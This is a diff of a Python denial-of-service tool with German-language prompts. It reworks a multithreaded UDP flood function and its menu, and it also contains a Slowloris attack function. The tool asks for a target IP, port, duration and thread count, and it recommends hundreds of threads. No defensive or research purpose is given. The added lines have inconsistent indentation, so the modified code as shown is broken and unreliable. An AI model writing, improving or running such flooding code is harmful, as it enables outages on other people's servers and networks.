@@ -24,21 +24,22 @@ def show_banner(color):
     print("\033[0m")
 
 # UDP Flood
-def udp_flood(ip, port, packet_size):
-    global packet_counter
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)  # Empfangsbuffer minimieren
-    udp_bytes = b"\x00" * packet_size  # Statische Daten für mehr Effizienz
+def udp_flood(ip, port, packet_size, packet_rate, duration):
+        global packet_counter
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udp_bytes = random._urandom(packet_size)
+        end_time = time.time() + duration
 
-    start_time = time.time()
-    while not stop_event.is_set():
-        try:
-            sock.sendto(udp_bytes, (ip, port))
-            packet_counter += 1
-            if packet_counter / (time.time() - start_time) > packet_rate:
-                time.sleep(0.001)  # Drosseln, falls nötig
-        except:
-            pass
+        start_time = time.time()
+        while time.time() < end_time and not stop_event.is_set():
+            try:
+                sock.sendto(udp_bytes, (ip, port))
+                packet_counter += 1
+                # Paketrate kontrollieren
+                if packet_counter / (time.time() - start_time) > packet_rate:
+                    time.sleep(0.001)  # Kurze Pause, um die Rate zu drosseln
+            except:
+                pass
 
 # Slowloris (TCP Keep-Alive)
 def slowloris(ip, port):
@@ -100,14 +101,15 @@ if __name__ == "__main__":
             print("[INFO] Programm beendet.")
             sys.exit()
 
-        if choice in ["1", "2"]:
-            ip = input("Ziel-IP-Adresse: ")
-            port = int(input("Ziel-Port: "))
-            duration = int(input("Dauer des Angriffs (Sekunden): "))
-            threads = int(input("Anzahl der Threads: "))
-            packet_size = int(input("Größe der Pakete in Bytes (z. B. 1024): "))
-            packet_rate = int(input("Maximale Pakete pro Sekunde (z. B. 50000): "))
-            stop_event.clear()
+        if choice == "1":  # UDP Flood
+    ip = input("Ziel-IP-Adresse: ")
+    port = int(input("Ziel-Port: "))
+    duration = int(input("Dauer des Angriffs (Sekunden): "))
+    threads = int(input("Anzahl der Threads (Empfehlung: 200-1000): "))
+    packet_size = int(input("Größe der Pakete in Bytes (z. B. 1024): "))
+    packet_rate = int(input("Maximale Pakete pro Sekunde (z. B. 50000): "))
+    
+    stop_event.clear()
 
             # Angriffsfunktionen den Optionen zuordnen
             if choice == "1":
@@ -118,16 +120,16 @@ if __name__ == "__main__":
                 args = (ip, port)  # Standard-Port für Slowloris
 
             # Threads starten
-            attack_threads = [
-                threading.Thread(target=attack_function, args=args)
-                for _ in range(threads)
-            ]
-            for thread in attack_threads:
-                thread.start()
+    attack_threads = [
+        threading.Thread(target=udp_flood, args=(ip, port, packet_size, packet_rate, duration))
+        for _ in range(threads)
+    ]
+    for thread in attack_threads:
+        thread.start()
 
             # Dashboard starten
-            dashboard_thread = threading.Thread(target=dashboard)
-            dashboard_thread.start()
+    dashboard_thread = threading.Thread(target=dashboard)
+    dashboard_thread.start()
 
-            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
-            stop_event.set()
+    input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
+    stop_event.set()
